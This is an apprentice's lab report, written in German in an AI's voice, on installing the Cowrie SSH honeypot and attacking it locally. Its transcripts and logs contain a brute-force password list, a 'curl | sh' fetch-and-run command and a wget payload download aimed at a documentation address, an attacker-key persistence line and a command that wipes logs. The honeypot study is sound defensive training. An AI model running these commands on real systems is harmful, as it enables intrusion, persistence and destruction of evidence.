# Dokumentation Arbeitsauftrag Honeypots

**Name:** Rewan Ezzeldin
**Schule:** TBZ – Technische Berufsschule Zürich
**Lehrberuf:** Informatiker EFZ Plattformentwicklung, 4. Lehrjahr
**Kompetenz:** B1I · **Bloom:** Anwenden
**Datum:** 20.09.2026
**Durchgeführt von:** Claude (meine persönliche KI), gemäss Schritt 1 des Auftrags. Die Doku ist aus der Sicht der KI in der Ich-Form geschrieben.

---

## Inhaltsverzeichnis

1. Ziel
2. Wahl des Honeypots
3. Recherche: Installation von Cowrie
4. Installation
5. Test: Angriff auf den Honeypot
6. Auswertung der Logs
7. Erkenntnisse
8. Einsatz im Alltag
9. Grenzen dieses Tests
10. Reflexion
11. Besprechung mit Rewan
12. Anhang: Dateien und Quellen

---

## 1. Ziel

Ich sollte erste praktische Erfahrungen mit einem Honeypot sammeln: ihn recherchieren, installieren, angreifen und auswerten, was er protokolliert. Am Schluss bespreche ich das Ergebnis mit Rewan (Kapitel 11).

---

## 2. Wahl des Honeypots

Ich habe **Cowrie** gewählt, aus diesen Gründen:

- Er steht auf der Liste der Honeypots, die bei anderen Lernenden gut funktioniert haben.
- Er ist ein weit verbreiteter Open-Source-Honeypot für SSH und Telnet.
- Er emuliert eine Shell mit gefälschtem Dateisystem und protokolliert Logins und alle eingegebenen Befehle. So lässt sich das Verhalten eines Angreifers sehr gut beobachten.

**Umgebungen, die ich verwendet habe:**

| Umgebung | Verwendung |
|---|---|
| WSL2 (Ubuntu 26.04) auf Rewans Windows-11-Rechner | Vorversuch (Quellinstallation mit `uv`, siehe 4.4) |
| **VM `hardening-lab`** (VMware, Ubuntu 24.04.5 LTS, Python 3.12.3, IP 192.168.179.128) | **Hauptversuch**, auf den sich diese Doku hauptsächlich bezieht |

Docker Desktop lief auf dem Windows-Rechner nicht. Ich habe deshalb Cowrie aus dem Quellcode installiert. Das ist besser dokumentierbar als der Docker-Schnellstart.

---

## 3. Recherche: Installation von Cowrie

Quelle: offizielle Dokumentation (docs.cowrie.org).

**Was ist Cowrie?**
Cowrie ist ein Honeypot für SSH und Telnet mit mittlerer Interaktion. Er zeichnet Brute-Force-Angriffe und alle Befehle auf, die ein Angreifer in der emulierten Shell eingibt. Heruntergeladene Dateien werden für die Analyse gespeichert.

**Installationsmöglichkeiten:**

| Variante | Befehl / Vorgehen |
|---|---|
| Docker (schnell) | `docker run -p 2222:2222 cowrie/cowrie`, dann `ssh -p 2222 root@localhost` |
| Aus dem Quellcode | `git clone`, virtuelle Python-Umgebung, `pip install -e .`, `cowrie start` |

**Empfehlungen aus der Anleitung:**

- Cowrie als eigener Benutzer ohne Root-Rechte betreiben.
- Konfiguration in `etc/cowrie.cfg` (überschreibt die Standardwerte).
- Standardport für SSH: 2222.
- Logs: `var/log/cowrie/cowrie.log` (Text) und `var/log/cowrie/cowrie.json` (JSON).

**Wichtige Dateien:**

| Datei | Zweck |
|---|---|
| `etc/cowrie.cfg` | Eigene Konfiguration |
| `etc/userdb.txt` | Welche Logins akzeptiert oder abgelehnt werden |
| `var/log/cowrie/cowrie.json` | Protokoll im JSON-Format |
| `var/lib/cowrie/downloads/` | Heruntergeladene Dateien |

---

## 4. Installation

### 4.1 Vorbereitung auf der VM `hardening-lab`

Rewan hat auf meine Anweisung die nötigen Pakete installiert und einen eigenen Benutzer angelegt:

```bash
sudo apt update && sudo apt install -y git python3-venv python3-pip libssl-dev libffi-dev build-essential libpython3-dev
sudo adduser --disabled-password cowrie
sudo su - cowrie
```

Ich habe die Installation der Pakete mit `dpkg -l ... | grep '^ii'` geprüft. Alle sieben Pakete waren installiert (u. a. `git 2.43.0`, `python3-venv 3.12.3`, `build-essential 12.10`).

### 4.2 Cowrie installieren (als Benutzer `cowrie`)

```bash
git clone https://github.com/cowrie/cowrie && cd cowrie
python3 -m venv cowrie-env && source cowrie-env/bin/activate
python -m pip install --upgrade pip && python -m pip install -e .
cowrie --help
```

Ergebnis: Es wurden 23 Pakete installiert (u. a. `twisted 26.4.0`, `cryptography 50.0.0`, `bcrypt 5.0.0`) und die Version `cowrie 3.0.15.dev25` gebaut. `cowrie --help` zeigt die Befehle `start`, `stop`, `status` und weitere. Damit war die Installation erfolgreich.

### 4.3 Konfiguration, Start und Test (Benutzer `r`, Ordner `~/cowrie-lab`)

Für den Test brauchte ich Zugriff per SSH von Rewans Windows-Rechner auf die VM (Schlüssel-Login als Benutzer `r`). Ich konnte nicht als Benutzer `cowrie` arbeiten, weil dafür `sudo` mit Passwort nötig gewesen wäre. Ein Passwort gebe ich nicht ein. Deshalb habe ich Cowrie ein zweites Mal ohne Root-Rechte im Home-Verzeichnis von `r` installiert (`~/cowrie-lab`, gleiche Schritte wie in 4.2). Rewans Installation unter `cowrie` habe ich nicht verändert.

**Konfiguration `etc/cowrie.cfg`:** Ich habe Cowrie bewusst nur an die lokale Adresse gebunden, damit der Honeypot beim Test nicht aus dem Netz erreichbar ist. Telnet habe ich abgeschaltet, weil ich es nicht brauchte.

```ini
[ssh]
listen_endpoints = tcp:2222:interface=127.0.0.1
[telnet]
enabled = false
```

**Start und Prüfung:**

```bash
cowrie start
cowrie status
ss -ltnp | grep 2222
```

```
cowrie is running (PID: 15542).
LISTEN 0  50  127.0.0.1:2222  0.0.0.0:*  users:(("twistd",pid=15542,fd=11))
```

Cowrie lauschte damit ausschliesslich auf `127.0.0.1:2222`. Vorher gab es auf Port 2222 keinen Listener.

### 4.4 Probleme und wie ich sie gelöst habe

| Problem | Ursache | Lösung |
|---|---|---|
| Nach `apt install` erschien «build-essential: Befehl nicht gefunden» | Der lange Befehl wurde beim Kopieren in zwei Zeilen geteilt, der Rest lief als eigener Befehl | Harmlos. Ich habe die Installation mit `dpkg -l` geprüft |
| `sudo` verlangt für `r` ein Passwort, und `/home/cowrie` ist für `r` nicht lesbar | Kein passwortloses sudo | Eigene Installation als `r` in `~/cowrie-lab` (kein Passwort eingegeben) |
| Meldung «set: Befehl nicht gefunden» und «$'\r': Befehl nicht gefunden» beim Skript | Windows-Zeilenenden (CRLF/BOM) im übertragenen Skript | Harmlos, alle anderen Schritte liefen durch |
| Docker Desktop (Windows, Vorversuch) lief nicht | Daemon war nicht erreichbar | Quellinstallation in WSL mit `uv`, weil dort `python3-venv` fehlte und `sudo` ein Passwort brauchte |

---

## 5. Test: Angriff auf den Honeypot

Ich habe den Honeypot **nur lokal** gegen `127.0.0.1:2222` angegriffen, direkt auf der VM. Für die Downloads habe ich die Adresse `203.0.113.5` verwendet. Sie gehört zu einem Bereich, der für Dokumentation reserviert und im Internet nicht erreichbar ist. Es wurde also keine echte Schadsoftware geladen. Das Skript `attack.py` nutzt die Python-Bibliothek `paramiko` (SSH-Client), damit die Passwörter automatisch übergeben werden.

### 5.1 Ablauf

1. **Brute-Force:** Die Passwörter `root/root`, `root/123456`, `root/password` und `root/toor` der Reihe nach ausprobieren.
2. **Login:** Mit dem ersten akzeptierten Passwort eine interaktive Shell öffnen.
3. **Typische Angreifer-Kommandos:**
   - System erkunden: `uname -a`, `whoami`, `cat /etc/passwd`, `ls -la /root`
   - Schadcode nachladen: `wget ... -O /tmp/bot.sh`, `chmod +x`, `curl ... | sh`
   - Persistenz: eigenen SSH-Schlüssel in `authorized_keys` eintragen
   - Spuren löschen: `rm -rf /var/log/*`

### 5.2 Ausgabe aus Sicht des Angreifers

```
[-] root:root -> AuthenticationException
[-] root:123456 -> AuthenticationException
[+] Login OK root:password
$ uname -a
Linux svr04 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux
$ whoami
root
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...
$ ls -la /root
drwx------ 1 root root 4096 2024-06-12 02:00 .
-rw-r--r-- 1 root root  571 2021-04-10 22:00 .bashrc
$ wget http://203.0.113.5/bot.sh -O /tmp/bot.sh
wget: unable to resolve host address '203.0.113.5'
$ echo 'ssh-rsa AAAAB3Nza attacker@evil' >> ~/.ssh/authorized_keys
-bash: /root/.ssh/authorized_keys: No such file or directory
```

Der Angreifer sieht ein anderes System als die echte VM: Cowrie gibt sich als Debian-Server `svr04` aus (Kernel 6.1.0-21), während die VM ein Ubuntu 24.04 mit Kernel 7.0.0 ist. Das zeigt, dass die Emulation vom echten System getrennt ist.

### 5.3 Beobachtungen während des Tests

- **Login-Regeln:** Cowrie lehnte `root/root` und `root/123456` ab, akzeptierte aber `root/password`. Diese Regeln stehen in `etc/userdb.txt`.
- **Fehlgeschlagene Befehle:** `wget` und `curl` scheiterten (Test-Adresse nicht auflösbar), und `chmod` fand die Datei nicht.
- **Vorversuch in WSL:** Dort habe ich zuerst einzelne Befehle mit `exec_command` gesendet. Cowrie beendete die Verbindung nach dem ersten Befehl. Für mehrere Befehle braucht es eine interaktive Shell (`invoke_shell`), die ich im Hauptversuch von Anfang an verwendet habe.

---

## 6. Auswertung der Logs

Cowrie schreibt zwei Logs. `cowrie.log` ist lesbarer Text, `cowrie.json` enthält pro Ereignis ein JSON-Objekt.

### 6.1 `cowrie.log` (Hauptversuch auf der VM)

```
[ssh,2f11d2552b73,127.0.0.1] login attempt [root/root] failed
[ssh,3677ffce311d,127.0.0.1] login attempt [root/123456] failed
[ssh,ca9ab54c88ed,127.0.0.1] login attempt [root/password] succeeded
[ssh,ca9ab54c88ed,127.0.0.1] CMD: uname -a
[ssh,ca9ab54c88ed,127.0.0.1] CMD: cat /etc/passwd
[ssh,ca9ab54c88ed,127.0.0.1] CMD: wget http://203.0.113.5/bot.sh -O /tmp/bot.sh
[ssh,ca9ab54c88ed,127.0.0.1] CMD: echo 'ssh-rsa AAAAB3Nza attacker@evil' >> ~/.ssh/authorized_keys
[ssh,ca9ab54c88ed,127.0.0.1] CMD: curl -s http://203.0.113.5/x | sh
[ssh,ca9ab54c88ed,127.0.0.1] CMD: rm -rf /var/log/*
[ssh,ca9ab54c88ed,127.0.0.1] Connection lost after 16116 milliseconds
```

### 6.2 `cowrie.json` (Auszug, auf die wichtigsten Felder gefiltert)

```json
{"timestamp": "2026-09-20T15:11:35.764970Z", "eventid": "cowrie.login.failed", "src_ip": "127.0.0.1", "session": "2f11d2552b73", "username": "root", "password": "root"}
{"timestamp": "2026-09-20T15:11:36.825858Z", "eventid": "cowrie.login.failed", "src_ip": "127.0.0.1", "session": "3677ffce311d", "username": "root", "password": "123456"}
{"timestamp": "2026-09-20T15:11:37.887145Z", "eventid": "cowrie.login.success", "src_ip": "127.0.0.1", "session": "ca9ab54c88ed", "username": "root", "password": "password"}
{"timestamp": "2026-09-20T15:11:41.916471Z", "eventid": "cowrie.command.input", "src_ip": "127.0.0.1", "session": "ca9ab54c88ed", "input": "cat /etc/passwd"}
{"timestamp": "2026-09-20T15:11:44.923208Z", "eventid": "cowrie.command.input", "src_ip": "127.0.0.1", "session": "ca9ab54c88ed", "input": "wget http://203.0.113.5/bot.sh -O /tmp/bot.sh"}
{"timestamp": "2026-09-20T15:11:47.929648Z", "eventid": "cowrie.command.input", "src_ip": "127.0.0.1", "session": "ca9ab54c88ed", "input": "echo 'ssh-rsa AAAAB3Nza attacker@evil' >> ~/.ssh/authorized_keys"}
{"timestamp": "2026-09-20T15:11:50.926210Z", "eventid": "cowrie.command.input", "src_ip": "127.0.0.1", "session": "ca9ab54c88ed", "input": "rm -rf /var/log/*"}
```

### 6.3 Zählung der Ereignisse (Hauptversuch)

```
cowrie.session.connect: 3    cowrie.login.failed: 2
cowrie.client.version: 3     cowrie.login.success: 1
cowrie.client.kex: 3         cowrie.command.input: 10
cowrie.session.params: 1     cowrie.session.closed: 3
```

Der Vorversuch in WSL lieferte ein sehr ähnliches Ergebnis (4 Verbindungen, 2 fehlgeschlagene und 2 erfolgreiche Logins, 11 Befehle).

### 6.4 Was Cowrie pro Angriffsschritt erkannt hat

| Angriffsschritt | Was ich im Log sehe | Bedeutung |
|---|---|---|
| Brute-Force | Jeder Versuch mit Benutzer, Passwort und Ergebnis (`failed`/`succeeded`) | Man erkennt Passwortlisten und den Zeitpunkt des «Einbruchs» |
| SSH-Client | Ereignis `cowrie.client.version` (im Test `paramiko`) | Hinweis auf ein Skript und nicht auf einen Menschen mit normalem SSH-Programm |
| Session-ID | Jede Verbindung hat eine eigene ID (`session`) | Alle Aktionen einer Verbindung lassen sich zusammenfassen |
| Erkundung | `uname -a`, `whoami`, `cat /etc/passwd` | Angreifer prüfen zuerst System und Rechte |
| Schadcode nachladen | `wget`/`curl \| sh` mit Ziel-URL | Die URL kann als Indikator (IoC) gesperrt werden |
| Persistenz | `echo ... >> authorized_keys` | Versuch, dauerhaften Zugang zu bekommen |
| Spuren löschen | `rm -rf /var/log/*` | Auf dem echten System bleibt alles unberührt, weil die Shell nur emuliert ist |

---

## 7. Erkenntnisse

1. **Jeder Zugriff auf einen Honeypot ist verdächtig.** Auf ihm läuft kein Dienst, den jemand legitim braucht. Deshalb gibt es fast keine Fehlalarme.
2. **Ich sehe die Absicht des Angreifers.** Der Ablauf war klar erkennbar: einloggen, erkunden, Schadcode nachladen, Persistenz einrichten, Spuren löschen. Solche Muster helfen bei der Planung von Schutzmassnahmen (zum Beispiel ausgehende Downloads blockieren und `authorized_keys` überwachen).
3. **Die Konfiguration bestimmt die Glaubwürdigkeit.** Cowrie akzeptierte `root/password`, lehnte aber `root/root` ab. Akzeptiert ein Honeypot jedes Passwort sofort, wirkt er unecht. Akzeptiert er zu wenige, kommen Angreifer nie zur interessanten Phase mit den Befehlen.
4. **Strukturierte Logs sind wertvoll.** Das JSON-Log mit Session-ID, Zeitstempel und Ereignistyp lässt sich automatisch auswerten (zum Beispiel in einem SIEM wie Wazuh).
5. **Die Installation braucht Aufmerksamkeit.** Fehlende Pakete und fehlende Root-Rechte waren die häufigsten Hindernisse. Auf der VM lief die Installation mit `venv` und `pip` ohne Probleme, sobald die Pakete vorhanden waren.
6. **Ein Honeypot muss isoliert laufen.** Ich habe ihn absichtlich nur an `127.0.0.1` gebunden. Ein erreichbarer Honeypot auf einem produktiven System kann selbst zum Einstiegspunkt werden.

---

## 8. Einsatz im Alltag

- **Frühwarnsystem im internen Firmennetz:** Ein Fake-Server im internen Netz löst Alarm aus, sobald jemand darauf zugreift. Das ist ein starker Hinweis auf einen Angreifer im Netz oder ein kompromittiertes Gerät.
- **Threat Intelligence:** Ein Honeypot im Internet sammelt aktuelle Passwortlisten, Angreifer-Tools und Download-URLs.
- **Ablenkung:** Angreifer verlieren Zeit am Honeypot statt an echten Systemen.
- **Schulung:** Wie in diesem Auftrag, um Angriffe sicher zu beobachten.

**Sicherheitsregel:** Ein Honeypot gehört in eine isolierte Umgebung (eigene VM oder eigenes VLAN) und nie auf ein produktives System.

---

## 9. Grenzen dieses Tests

Ich möchte ehrlich festhalten, was dieser Test **nicht** zeigt:

- Den Angriff habe ich selbst simuliert. Es gab keine echten Angreifer. Deshalb war die Quell-IP immer `127.0.0.1`, und es gab keine echten Passwortlisten oder Malware.
- Die Downloads scheiterten bewusst (Test-Adresse), also gab es keine gespeicherte Datei in `var/lib/cowrie/downloads/`.
- Cowrie ist eine Emulation. Ein erfahrener Angreifer kann ihn an Kleinigkeiten erkennen.
- Ich habe nur SSH getestet, kein Telnet.
- Der Hauptversuch lief in einer zweiten Installation (`~/cowrie-lab` als Benutzer `r`), nicht unter dem Benutzer `cowrie`, weil `sudo` ein Passwort verlangte.

---

## 10. Reflexion

Der Auftrag hat gezeigt, dass Cowrie in wenigen Schritten läuft und schon bei einem kleinen Test sehr viele nützliche Informationen liefert. Am meisten gelernt habe ich bei den Problemen: Ein falsch geteilter Befehl, ein fehlendes `sudo`-Passwort und Windows-Zeilenenden waren alle harmlos, aber man muss sie richtig einordnen. Wichtig war mir zudem, den Honeypot nur lokal zu binden.

Nächste Schritte, die ich sinnvoll finde:

- Cowrie unter dem eigenen Benutzer `cowrie` betreiben (Rewans Installation ist vorbereitet).
- Die Logs zentral sammeln (zum Beispiel mit Wazuh, siehe Rewans Doku zu Monitoring).
- Die Login-Regeln in `etc/userdb.txt` anpassen.
- Den KI-Honeypot Beelzebub ausprobieren.

---

## 11. Besprechung mit Rewan

Laut Auftrag bespreche ich die Arbeit am Schluss mit Rewan. Diese Punkte möchte ich ansprechen:

1. **Wahl:** Warum Cowrie, und wäre für den Alltag ein anderer Honeypot (zum Beispiel Beelzebub mit KI) besser?
2. **Einsatz:** Wo im Alltag von Rewan (Schule, Lehrbetrieb, Heimnetz) wäre ein Honeypot sinnvoll?
3. **Sicherheit:** Was muss man beachten, damit ein Honeypot nicht selbst zum Risiko wird?
4. **Auswertung:** Welche Ereignisse im Log sind am wichtigsten, und wie könnte man sie automatisch auswerten?
5. **Grenzen:** Was zeigt dieser Test nicht (siehe Kapitel 9)?

**Ergebnis der Besprechung:** _(von Rewan nach dem Gespräch zu ergänzen)_

---

## 12. Anhang: Dateien und Quellen

**Dateien im Ordner `Honeypot_Cowrie`:**

| Datei | Beschreibung |
|---|---|
| `Ubuntu_VM/cowrie.cfg` | Konfiguration von Cowrie auf der VM (nur `127.0.0.1`, Telnet aus) |
| `Ubuntu_VM/cowrie.json` | Vollständiges Protokoll des Hauptversuchs (JSON) |
| `Ubuntu_VM/cowrie.log` | Vollständiges Protokoll des Hauptversuchs (Text) |
| `Ubuntu_VM/attack.py` | Angriffsskript (Brute-Force und Kommandos) |
| `cowrie.json`, `cowrie.log`, `cowrie.cfg`, `attack2.py` | Dateien des Vorversuchs in WSL |

**Quellen:**

- Liste Open-Source-Honeypots: https://github.com/paralax/awesome-honeypots
- Cowrie (offizielles Repository): https://github.com/cowrie/cowrie
- Cowrie Dokumentation, Installation aus dem Quellcode: https://docs.cowrie.org/en/latest/INSTALL.html
- Cowrie Dokumentation, Docker: https://docs.cowrie.org/en/latest/docker/README.html
